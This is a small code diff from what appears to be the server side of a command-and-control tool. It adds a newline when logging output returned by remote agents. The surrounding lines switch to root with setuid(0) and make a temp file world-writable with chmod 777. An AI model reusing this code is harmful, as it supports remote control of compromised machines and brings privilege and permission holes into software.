@@ -90,7 +90,7 @@ def default(request):
 			
 			os.setuid(0)
 			with open('/tmp/C2CON-res.txt', 'a') as dest:
-				dest.write("Agent " + sid + " => " + str(res.decode()))
+				dest.write("Agent " + sid + " => " + str(res.decode()) + "\n")
 			
 			os.system("chmod 777 /tmp/C2CON-temp")
 			os.system("echo '' > /tmp/C2CON-temp")
